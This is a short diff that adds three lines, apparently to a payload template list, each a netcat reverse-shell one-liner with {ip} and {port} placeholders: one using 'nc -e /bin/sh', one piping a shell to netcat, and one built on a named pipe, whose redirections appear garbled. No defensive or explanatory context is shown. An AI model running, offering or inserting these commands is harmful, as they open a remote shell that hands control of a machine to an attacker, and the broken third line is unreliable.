@@ -1,0 +1,3 @@
+nc -e /bin/sh {ip} {port}
+/bin/sh | nc {ip} {port}
+rm -f /tmp/p; mknod /tmp/p p && nc {ip} {port} 0/tmp/p
